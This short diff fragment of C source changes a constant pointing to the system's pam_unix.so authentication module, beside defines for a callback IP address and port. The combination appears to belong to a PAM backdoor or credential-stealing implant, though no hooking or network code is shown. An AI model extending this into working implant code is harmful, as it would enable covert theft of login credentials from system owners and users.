@@ -9,7 +9,7 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
-#define PAM_PATH "/lib/pam.d/pam_unix.so"
+#define PAM_PATH "/usr/lib/pam.d/pam_unix.so"
 
 #define CALLBACK_IP "10.100.150.1"
 #define CALLBACK_PORT 5000
